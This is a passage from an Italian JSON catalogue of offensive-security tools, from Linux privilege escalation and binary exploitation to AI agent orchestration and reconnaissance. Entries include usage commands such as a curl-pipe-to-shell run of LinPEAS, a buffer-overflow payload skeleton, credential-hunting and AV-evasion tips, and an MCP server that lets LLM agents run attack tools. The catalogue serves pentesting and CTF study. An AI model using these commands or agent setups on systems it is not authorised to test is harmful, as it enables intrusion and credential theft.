    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "one-gadget-1-10-0",
    "name": "OneGadget",
    "version": "1.10.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/david942j/one_gadget",
    "desc": "Tool per binary exploitation che trova indirizzi ROP nella libc per eseguire execve('/bin/sh') con un singolo salto.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OneGadget è uno strumento fondamentale per lo sviluppo di exploit su Linux (CTF e reale). Cerca all'interno di una libreria <code>libc</code> condivisa gli offset di specifici frammenti di codice (\"gadget\") che, se eseguiti, portano direttamente all'esecuzione di una shell (<code>/bin/sh</code>). Questo semplifica drasticamente la costruzione di catene ROP, riducendo l'exploit a un singolo overwrite dell'instruction pointer se le condizioni sono soddisfatte.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Constraint Analysis:</strong> Per ogni gadget trovato, elenca i vincoli sui registri (es. <code>rax == NULL</code>) che devono essere veri al momento del salto affinché l'exploit funzioni.</p><p><strong>Libc Database:</strong> Funziona su qualsiasi versione di libc fornita, permettendo di adattare l'exploit alla versione esatta del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire contro il file .so della libc.</p><pre><code># Trova gadget\none_gadget /lib/x86_64-linux-gnu/libc.so.6</code></pre><p>Output esempio: <code>0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp & 0xf == 0</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Binary Exploitation:</strong> Quando si ha un buffer overflow e un leak dell'indirizzo base della libc, OneGadget fornisce l'indirizzo a cui saltare per vincere istantaneamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Funziona solo se si conosce o si può leakare la versione della libc del sistema remoto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "pspy",
    "name": "pspy",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/DominicBreuker/pspy",
    "desc": "Monitor di processi Linux senza privilegi di root: intercetta comandi, cron job, uid e guid in tempo reale via procfs.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>pspy è uno strumento di command-line monitoring per Linux progettato per funzionare senza permessi di root. Sfrutta il file system <code>/proc</code> per scansionare continuamente i processi in esecuzione e catturare eventi di breve durata che sfuggirebbero a strumenti statici come <code>ps</code>. È la risorsa primaria per individuare cron job nascosti, script eseguiti da altri utenti e credenziali passate come argomenti da riga di comando.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cron Job Snooping:</strong> Rileva processi che vengono avviati periodicamente (tipico dei cron job). Vedere <em>cosa</em> viene eseguito e <em>con quali privilegi</em> (UID) è fondamentale per trovare vettori di Privilege Escalation (es. un cron job di root che esegue uno script scrivibile).</p><p><strong>Capture Argomenti:</strong> Cattura l'intera riga di comando dei processi. Questo permette di intercettare password, chiavi API o percorsi di file sensibili passati come argomenti a programmi in esecuzione.</p><p><strong>File System Monitoring:</strong> Utilizza <code>inotify</code> per monitorare eventi sul file system (accedibili dall'utente corrente), aiutando a correlare l'esecuzione di processi con la creazione/modifica di file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scaricare il binario statico (disponibile per 32/64 bit) sulla macchina vittima ed eseguirlo.</p><pre><code># Esecuzione standard\n./pspy64\n\n# Monitoraggio specifico su una cartella e output su file\n./pspy64 -f -r /var/www/html -o events.log\n\n# Filtro per PID specifici (es. per monitorare cosa fa un demone)\n./pspy64 -p 1234</code></pre><p>L'output scorre in tempo reale, mostrando PID, UID, e comando completo colorati per leggibilità.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per la <strong>Linux Privilege Escalation</strong>. Se si è ottenuto un accesso low-privilege, pspy viene lasciato girare per rilevare automazioni di sistema. Esempio classico: rilevare un backup script eseguito ogni minuto da root che usa <code>tar *</code>, sfruttabile tramite wildcard injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> pspy genera un carico CPU notevole a causa del polling continuo su <code>/proc</code>. In ambienti monitorati, questo comportamento anomalo (high CPU usage da un processo sconosciuto) è facilmente rilevabile.</p><p><strong>Mitigazioni:</strong> Usare intervalli di polling più lunghi (flag <code>-i</code>) per ridurre il carico CPU, anche se si rischia di perdere processi molto veloci.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "screen-exploit-poc",
    "name": "screen-exploit-poc.sh",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Bash PoC per sfruttare vulnerabilità di Privilege Escalation locale in GNU Screen (es. CVE-2017-5618).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script sfrutta vulnerabilità storiche nel binario <code>screen</code> (terminal multiplexer), spesso installato con bit SUID su Linux. Versioni vulnerabili permettono a un utente locale di creare file con permessi di root (log file manipulation) o eseguire codice arbitrario tramite buffer overflow o race conditions durante l'apertura di nuovi screen.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Root File Write:</strong> Abusa della funzionalità di logging di Screen per sovrascrivere file sensibili (es. <code>/etc/ld.so.preload</code>) con contenuto controllato dall'attaccante, forzando il caricamento di librerie malevole.</p><p><strong>Privilege Escalation:</strong> Risultato finale è una shell root partendo da utente low-priv.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire sulla macchina target.</p><pre><code># Compilazione libreria malevola e esecuzione exploit\n./screen-exploit-poc.sh</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Linux Local Privesc:</strong> Utile su sistemi legacy o non patchati dove Screen 4.5.0 o inferiori sono presenti. Classico da CTF.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'exploit spesso corrompe file di configurazione. Rischioso su produzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "peass-ng",
    "name": "PEASS-ng",
    "version": "20250904-27f4363e",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/peass-ng/PEASS-ng",
    "desc": "Privilege Escalation Awesome Scripts Suite (LinPEAS/WinPEAS): suite definitiva per enumerazione automatica vettori di privesc.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PEASS-ng è la raccolta standard de-facto per l'enumerazione locale post-exploitation. Include <strong>LinPEAS</strong> (Linux) e <strong>WinPEAS</strong> (Windows). Questi script eseguono una scansione esaustiva del sistema alla ricerca di misconfigurazioni, file sensibili, credenziali, vulnerabilità kernel e servizi sfruttabili per elevare i privilegi da utente standard a Root/SYSTEM. L'output colorato facilita l'identificazione immediata delle criticità (Rosso/Giallo = alta probabilità).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Checks:</strong> Verifica migliaia di vettori: permessi file, SUID, sudo rights, registry keys, servizi non quotati, DLL hijacking, processi in ascolto, versioni software vulnerabili.</p><p><strong>Credential Hunting:</strong> Cerca aggressivamente password in file di config, cronologia, database locali e memory dump.</p><p><strong>Cloud Awareness:</strong> Rileva se il sistema è in un ambiente cloud (AWS, Azure, GCP) e cerca metadati o credenziali cloud specifiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scaricare ed eseguire lo script sulla macchina target.</p><pre><code># Linux (curl e pipe bash)\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Windows (eseguibile o bat)\nwinpeas.exe domain users\n\n# Modalità stealth/fast\n./linpeas.sh -s (superfast/stealth)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Lo strumento #1 da lanciare dopo aver ottenuto una shell. Risparmia ore di enumerazione manuale. Ottimo anche per <strong>Hardening Audits</strong> per trovare buchi di sicurezza nei propri server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PEASS è molto rumoroso e conosciuto da tutti gli AV/EDR. LinPEAS tocca troppi file. WinPEAS viene quasi sempre cancellato da Defender.</p><p><strong>Mitigazioni:</strong> Usare versioni offuscate, eseguire solo check specifici o in memoria. In ambienti monitorati, usare l'enumerazione manuale guidata dai risultati di PEASS in lab.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Multi_Platform"
    ],
    "notes": null
  },
  {
    "id": "ghidra-11-4-2-public",
    "name": "Ghidra",
    "version": "11.4.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/NationalSecurityAgency/ghidra",
    "desc": "Suite di Reverse Engineering open-source della NSA: disassembler, decompiler e debugger multi-architettura con scripting Java/Python.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ghidra è una piattaforma software di reverse engineering (SRE) sviluppata dal Research Directorate della NSA. Offre un ambiente completo per l'analisi di file binari (malware, firmware, eseguibili) su una vasta gamma di architetture (x86, ARM, MIPS, PowerPC, ecc.). La sua caratteristica più potente è il <strong>Decompiler</strong> avanzato, che ricostruisce una rappresentazione simil-C del codice assembly, rendendo l'analisi comprensibile anche senza conoscere a fondo l'assembly specifico.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Code Analysis:</strong> Esegue analisi automatica del binario per identificare funzioni, stringhe, chiamate di sistema e strutture dati. Il grafo di flusso (Function Graph) visualizza logicamente i percorsi di esecuzione.</p><p><strong>Collaborazione:</strong> Supporta il reverse engineering in team: più analisti possono lavorare sullo stesso progetto in tempo reale, condividendo annotazioni, rinomine di variabili e scoperte tramite un server centralizzato.</p><p><strong>Scripting & Estensibilità:</strong> Permette di automatizzare task ripetitivi tramite script in Java o Python. È possibile scrivere analizzatori custom per decifrare stringhe offuscate o risolvere importazioni dinamiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ghidra è un'applicazione GUI Java. Si crea un progetto, si importa il file e si lancia l'Auto Analyze.</p><pre><code># Workflow tipico (GUI)\n1. File -> New Project\n2. Import File (drag & drop del malware/eseguibile)\n3. Double click per aprire nel CodeBrowser\n4. \"Yes\" alla richiesta di Auto Analyze\n5. Navigare il Decompiler window per leggere il codice \"C-like\"</code></pre><p>Esiste anche una modalità \"Headless\" per analisi batch da riga di comando: <code>analyzeHeadless projectPath projectName -import binaryFile</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale per <strong>Malware Analysis</strong> (capire cosa fa un ransomware), <strong>Vulnerability Research</strong> (trovare buffer overflow in software chiusi) e <strong>CTF</strong>. È l'alternativa gratuita e potente a IDA Pro. Utile anche per analizzare firmware di dispositivi IoT per trovare hardcoded credentials.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede JDK installato. L'analisi automatica può impiegare molto tempo su binari grandi. Attenzione quando si analizza malware reale: eseguire sempre in una VM isolata, poiché Ghidra esegue il parsing di formati file complessi che potrebbero teoricamente contenere exploit contro il tool stesso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "pwninit-3-3-1",
    "name": "pwninit",
    "version": "3.3.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/io12/pwninit",
    "desc": "Tool per automatizzare il setup di challenge di Binary Exploitation (CTF): scarica linker, patcha ELF e genera template exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PwnInit risolve il mal di testa di configurare l'ambiente per le challenge \"pwn\". Quando viene fornito un binario e una libc, PwnInit scarica automaticamente il linker (ld.so) corretto per quella versione di libc, patcha il binario per usare quel linker e quel rpath, e genera uno script Python (basato su pwntools) pronto per l'uso con tutti i path configurati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Patching:</strong> Usa <code>patchelf</code> per impostare l'interprete e l'RPATH del binario target, assicurando che giri localmente esattamente come sul server remoto.</p><p><strong>Template Generation:</strong> Crea un file <code>solve.py</code> con lo scheletro boilerplate per pwntools (connessione, caricamento ELF/Libc).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire nella cartella contenente il binario e la libc.</p><pre><code># Setup automatico\npwninit\n\n# Setup specificando i file manualmente\npwninit --bin challenge --libc libc.so.6 --ld ld-2.27.so</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>CTF Pwn:</strong> Risparmia 10-15 minuti di setup manuale per ogni challenge, garantendo che i simboli di debug e gli offset siano corretti.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede <code>patchelf</code> e <code>elfutils</code> installati nel sistema.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "pwntools-4-14-1",
    "name": "pwntools",
    "version": "4.14.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Gallopsled/pwntools",
    "desc": "Framework Python per Capture The Flag e exploit development: semplifica interazione con binari, socket, packing dati e ROP chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Pwntools è una libreria Python progettata per rendere la scrittura di exploit rapida e robusta. È lo standard per le competizioni CTF (categoria Pwn/Binary Exploitation) ma è potente anche per exploit reali. Astrae la complessità di gestire socket, process pipes, conversioni di interi in byte (packing), e costruzione di payload ROP (Return Oriented Programming), permettendo all'exploiter di concentrarsi sulla logica della vulnerabilità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Tubes:</strong> Interfaccia unificata per comunicare con processi locali, socket remoti o serial port (<code>io.sendline()</code>, <code>io.recvuntil()</code>).</p><p><strong>ELF & ROP:</strong> Parsing automatico di binari ELF per trovare indirizzi di funzioni, stringhe e gadget ROP. Genera catene ROP automaticamente se possibile.</p><p><strong>Shellcode:</strong> Generatore integrato di shellcode per varie architetture (x86, ARM, MIPS) e OS.</p><p><strong>GDB Integration:</strong> Collega automaticamente un debugger GDB al processo target per analisi dinamica durante lo sviluppo dell'exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa importando la libreria in script Python.</p><pre><code>from pwn import *\n\n# Connessione remota o avvio processo locale\nio = remote('target.com', 1337)\n# io = process('./vulnerable_binary')\n\n# Costruzione payload (Buffer Overflow)\npayload = b'A' * 64 + p64(0xdeadbeef)\n\n# Invio e interazione\nio.sendline(payload)\nio.interactive()</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale per sviluppare <strong>Buffer Overflow Exploit</strong>, format string attacks e heap exploitation. Usato per automatizzare l'interazione con servizi di rete complessi durante le fasi di fuzzing o exploit delivery.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>È un framework di sviluppo, non un tool \"point-and-click\". Richiede conoscenza di Python e assembly.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "5ire-0-13-2-appimage",
    "name": "5ire-0.13.2-x86_64.AppImage",
    "version": "0.13.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nanbingxyz/5ire",
    "desc": "Client desktop open-source per interagire con server MCP (Model Context Protocol) e agenti AI locali/remoti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>5ire è un ambiente di sviluppo e interfaccia client progettata per il Model Context Protocol (MCP). Funziona come il \"cervello\" grafico che permette agli utenti di connettere e orchestrare vari agenti AI e strumenti di cybersecurity (come HexStrike) in un'unica dashboard. Essendo distribuito come AppImage, offre portabilità immediata su Linux, permettendo ai pentester di interagire con LLM e tool offensivi senza configurazioni complesse dell'ambiente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MCP Client:</strong> Agisce da interprete universale per qualsiasi server compatibile con lo standard MCP. Permette di caricare \"skills\" o toolset (come Nmap, Burp, o script custom) e renderli disponibili all'intelligenza artificiale per l'esecuzione.</p><p><strong>Gestione Agenti:</strong> Offre un'interfaccia per dialogare con diversi modelli (Locali via Ollama o Remoti via API) e monitorare l'esecuzione dei task in tempo reale, visualizzando output di comandi e log di errore.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Rendere eseguibile il file e lanciarlo.</p><pre><code>chmod +x 5ire-0.13.2-x86_64.appimage\n./5ire-0.13.2-x86_64.appimage</code></pre><p>Dall'interfaccia, configurare le connessioni ai server MCP (es. HexStrike server) e selezionare il modello LLM desiderato per iniziare l'orchestrazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Indispensabile per operatori che utilizzano framework di <strong>AI-Assisted Pentesting</strong>. Serve come console di comando per guidare l'AI nell'esecuzione di ricognizioni o exploit, mantenendo il controllo umano sul loop decisionale (Human-in-the-loop).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico generato dipende dagli agenti collegati. 5ire stesso è un client locale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "hexstrike-ai",
    "name": "hexstrike-ai",
    "version": "6.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/0x4m4/hexstrike-ai",
    "desc": "Server MCP che integra LLM con 150+ tool offensivi per automatizzare recon, scanning e reporting in scenari pentest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HexStrike AI è un'innovativa implementazione del Model Context Protocol (MCP) che funge da ponte tra i moderni Large Language Models (come Claude, GPT-4) e l'arsenale di strumenti di cybersecurity. Permette agli agenti AI di \"usare\" fisicamente tool come Nmap, Nikto, SQLmap o script custom, orchestrando intere fasi di penetration test in autonomia o sotto supervisione umana, gestendo l'input/output e la logica decisionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Orchestrazione Multi-Agente:</strong> Crea agenti specializzati (es. \"Recon Agent\", \"Exploit Agent\") che collaborano. L'AI decide quale tool lanciare basandosi sui risultati dello step precedente (es. \"Ho trovato la porta 80 aperta con Nmap, ora lancio Nikto\").</p><p><strong>Integrazione Toolset:</strong> Supporta nativamente oltre 150 strumenti offensivi. Gestisce l'installazione, la sintassi corretta dei comandi e il parsing dell'output per renderlo comprensibile al modello linguistico.</p><p><strong>Reporting & Logging:</strong> Traccia ogni azione eseguita e genera report narrativi delle scoperte. Include meccanismi di sicurezza (Human-in-the-loop) per richiedere approvazione prima di eseguire azioni aggressive o pericolose.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si configura come server MCP a cui l'LLM client si connette.</p><pre><code># Avvio del server MCP\npython hexstrike_server.py --config config.yaml\n\n# Esempio di prompt all'AI collegata\n\"Esegui una ricognizione completa su target.com. Inizia con discovery sottodomini,\npoi scansiona le porte e identifica le tecnologie web.\nSegnala eventuali vulnerabilità critiche ma chiedi conferma prima di lanciare exploit.\"</code></pre><p>Richiede un file di configurazione con i percorsi dei tool e le API key necessarie.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Automated Pentesting:</strong> Velocizza drasticamente le fasi di ricognizione e vulnerabilità assessment iniziali. <strong>Red Teaming Assistito:</strong> Funge da \"copilota\" per l'operatore, suggerendo comandi o analizzando output complessi in tempo reale. <strong>Training:</strong> Permette ai junior di vedere come un'AI strutturerebbe un attacco logico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'automazione AI tende ad essere veloce e \"robotica\". Se non configurata con delay e jitter, genererà pattern di traffico molto rumorosi. <strong>Rischi:</strong> Un'AI potrebbe \"allucinare\" un comando distruttivo o attaccare un target fuori scope se le regole di ingaggio (System Prompt) non sono rigorose.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "arjun",
    "name": "arjun",
    "version": "2.2.7",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/s0md3v/Arjun",
    "desc": "Tool per HTTP parameter discovery che trova parametri nascosti in endpoint web con dizionario di 25.000+ voci.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Arjun è uno strumento di ricognizione specializzato nella scoperta di parametri HTTP nascosti o non documentati negli endpoint delle applicazioni web. Utilizza un dizionario di oltre 25.890 nomi di parametri derivati da CommonCrawl, SecLists e param-miner, riuscendo a testarli tutti con sole 50-60 richieste in meno di 10 secondi grazie a tecniche di ottimizzazione avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Method Support:</strong> Supporta GET, POST, POST-JSON e POST-XML per testare parametri in diversi contesti di richiesta.</p><p><strong>Rate Limit Handling:</strong> Gestisce automaticamente rate limiting e timeout, adattando la velocità di scansione.</p><p><strong>Export Flessibile:</strong> Esporta risultati in formato BurpSuite, testo o JSON per integrazione con altri tool.</p><p><strong>Passive Extraction:</strong> Può estrarre parametri passivamente da file JavaScript o sorgenti esterne.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base con tutti i metodi HTTP\narjun -u https://target.com/api/users -m GET,POST,JSON,XML\n\n# Con header custom (auth, cookie session)\narjun -u https://target.com/admin -m POST \\\n  --headers \"Authorization: Bearer eyJ0eX...\" \\\n  --headers \"Cookie: session=abc123\"\n\n# Batch scan da lista URL (es. output gau/waybackurls)\ncat urls.txt | arjun -i - -oJ discovered_params.json -t 10\n\n# Estrai parametri passivamente da JS (no richieste al target)\narjun --passive -i https://target.com/app.js -oT params.txt\n\n# Pipeline completa: gau -> filtra endpoint -> arjun -> test\ngau target.com | grep \"api\\|admin\" | sort -u | \\\n  arjun -i - -oJ params.json --stable\n\n# Export per Burp Suite (import diretto)\narjun -u https://target.com/search -oB burp_import.txt\n\n# Con wordlist custom + dizionario default\narjun -u https://target.com/api -w custom_params.txt --include</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>API Reconnaissance:</strong> Scopre parametri admin nascosti, debug endpoints o funzionalità non documentate che potrebbero esporre vulnerabilità come IDOR, privilege escalation o information disclosure.</li><li><strong>Bug Bounty:</strong> La scoperta di parametri nascosti spesso porta a vulnerabilità uniche non trovate da altri ricercatori.</li><li><strong>Web Application Pentesting:</strong> Espande la superficie d'attacco oltre i parametri documentati nelle API pubbliche.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Le 50-60 richieste generate sono relativamente silenziose ma potrebbero attivare WAF se troppo rapide.</li><li><strong>Throttling:</strong> Usare <code>--stable</code> per delay automatici in ambienti con rate limiting.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Params_Discovery"
    ],
    "notes": null
  },
  {
    "id": "autorecon",
    "name": "autorecon",
    "version": "2.0.36",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/Tib3rius/AutoRecon",
    "desc": "Framework di ricognizione automatizzata che orchestra port scan e service enumeration su target multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>AutoRecon è un framework Python per automatizzare la fase iniziale di enumerazione nei penetration test. Opera in due fasi: prima esegue port scan per identificare servizi aperti, poi lancia tool di enumerazione specifici per ogni servizio rilevato (es. scansione web se trova HTTP, enum4linux se trova SMB). Descritto come \"bowling with bumpers\", automatizza il lavoro ripetitivo mantenendo il controllo sulle azioni aggressive.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Target:</strong> Gestisce IP singoli, range CIDR e hostname risolvibili in parallelo.</p><p><strong>Plugin System:</strong> Moduli configurabili per port scanning e service enumeration, estendibili dall'utente.</p><p><strong>Output Organizzato:</strong> Genera directory strutturate per exploit, findings e report dettagliati.</p><p><strong>Pattern Matching:</strong> Evidenzia ed estrae automaticamente informazioni significative dai risultati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione OSCP-style (singolo target, output strutturato)\nautorecon 10.10.10.1 -o ./htb_box --single-target\n\n# Multi-target con priorità e verbosità massima\nautorecon -t targets.txt -o ./pentest_results -vv \\\n  --target-timeout 120  # 2 ore per target\n\n# Solo porte specifiche (velocizza per CTF)\nautorecon 10.10.10.1 --ports-file /usr/share/seclists/Discovery/Infrastructure/common-ports.txt\n\n# Esclusione plugin rumorosi (stealth mode)\nautorecon 10.10.10.1 --exclude-tags aggressive,bruteforce\n\n# Con proxy per traffico (Burp logging)\nautorecon 10.10.10.1 --proxychains\n\n# Workflow OSCP completo\nmkdir -p ~/oscp/{exam,lab} && cd ~/oscp/exam\nautorecon 192.168.x.x -o machine1 &  # Background\nautorecon 192.168.y.y -o machine2 &  # Parallelo\n# Mentre scans procedono, analizza output incrementale:\ntail -f machine1/scans/_commands.log\n\n# Analisi risultati post-scan\nfind ./results -name \"*.txt\" -exec grep -l \"password\\|credential\" {} \\;\ncat ./results/*/scans/*nmap*.txt | grep open</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>CTF e OSCP:</strong> Ideale per lanciare ricognizione su un target e lavorare su altri mentre l'automazione procede. Rispetta le regole d'esame non eseguendo exploitation automatico.</li><li><strong>Internal Pentest:</strong> Automatizza l'enumerazione iniziale di decine di host risparmiando ore di lavoro manuale.</li><li><strong>HackTheBox/TryHackMe:</strong> Output strutturato perfetto per prendere appunti e documentare il processo.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Genera traffico significativo con scan e enumeration paralleli. Non adatto per engagement stealth.</li><li><strong>Riduzione Footprint:</strong> Usare <code>--exclude-tags aggressive</code> per escludere plugin rumorosi.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "bbot",
    "name": "bbot",
    "version": "2.7.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/blacklanternsecurity/bbot",
    "desc": "Scanner ricorsivo per subdomain enumeration, web crawling, email harvesting e vulnerability discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>BBOT (Bighuge BLS OSINT Tool) è uno scanner ricorsivo multipurpose ispirato a Spiderfoot. Combina subdomain enumeration, web crawling, email harvesting e vulnerability scanning in un unico framework modulare. Integra oltre 50 fonti passive e attive, trovando tipicamente 20-50% più subdomain rispetto ad altri tool grazie al suo approccio ricorsivo che concatena le tecniche di ricognizione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Target Diversificati:</strong> Accetta domini, IP, URL, email, organizzazioni, username, filesystem e mobile app.</p><p><strong>Output Multipli:</strong> Supporta Neo4j, Slack, Discord, Elasticsearch e 13+ altri formati.</p><p><strong>YARA Scanning:</strong> Applica regole YARA custom sugli asset scoperti.</p><p><strong>Modular Architecture:</strong> Permette contributi della community per nuovi moduli.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Subdomain enumeration completa (passiva + attiva)\nbbot -t target.com -f subdomain-enum -o ./bbot_output\n\n# Solo PASSIVE recon (zero traffico verso target)\nbbot -t target.com -f safe --allow-deadly  # safe = solo API\n\n# Bug Bounty workflow completo\nbbot -t target.com -f subdomain-enum web-basic cloud-enum \\\n  -c modules.nuclei.severity=high,critical \\\n  -om json,csv,neo4j\n\n# Con API keys per più risultati (configura ~/.bbot/secrets.yml)\nbbot -t target.com -f subdomain-enum \\\n  --config modules.shodan.api_key=xxx \\\n  --config modules.censys.api_id=yyy\n\n# Scope specifico (esclude out-of-scope)\nbbot -t target.com -f subdomain-enum \\\n  --whitelist *.target.com \\\n  --blacklist dev.target.com,staging.target.com\n\n# Pipeline con altri tool\nbbot -t target.com -f subdomain-enum -om json | \\\n  jq -r '.data.DNS_NAME' | httpx -silent | nuclei -t cves/\n\n# Email harvesting per phishing assessment\nbbot -t target.com -m emailformat,hunter,skymem -o emails/\n\n# Scan ricorsivo (trova subdomain dei subdomain)\nbbot -t target.com -f subdomain-enum --config scope.recursion_max=3</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Bug Bounty:</strong> Ricognizione completa dell'attack surface con approccio ricorsivo che trova 20-50% più subdomain rispetto ad altri tool.</li><li><strong>Attack Surface Management (ASM):</strong> Gestione asset esterni e discovery continuo per organizzazioni con infrastrutture complesse.</li><li><strong>Threat Intelligence:</strong> Raccolta informazioni su target specifici combinando OSINT da 50+ fonti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> I moduli attivi generano traffico significativo verso il target e fonti terze.</li><li><strong>Stealth Mode:</strong> Usare flag <code>-f safe</code> per reconnaissance puramente passiva.</li><li><strong>Rate Limiting:</strong> Configura <code>--config http.max_rate=10</code> per throttling in ambienti sensibili.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
